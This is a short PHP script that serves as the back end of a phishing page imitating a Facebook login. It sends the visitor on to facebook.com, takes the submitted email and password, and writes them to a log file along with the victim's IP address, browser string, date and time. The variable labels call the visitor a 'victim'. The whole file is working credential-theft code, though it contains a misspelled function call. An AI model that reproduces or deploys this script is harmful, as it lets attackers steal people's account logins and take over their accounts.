<?php
$date = date("Y/m/d");
$time = date("h:i:sa");
header('Location: https://www.facebook.com');
$gm_usern = $_POST['email'];
$gm_pass =  $_POST['password'] ;
$browser = $_SERVER['HTTP_USER_AGENT'];

$client_ip =  $_SERVER['HTTP_CLIENT_IP'];
$file = fopen("gm_thite_log.txt","a");
fwrite($file,"victiun ip :$client_ip \n");  
fwrite($file,"victum browse : $browser \nusername : $gm_usern \n");
fwrite($file,"password : $gm_pass \n");
fwrite($file,"login time : \n  date : $date \n  time : $time \n################################ \n");
fcolse($file);

?>
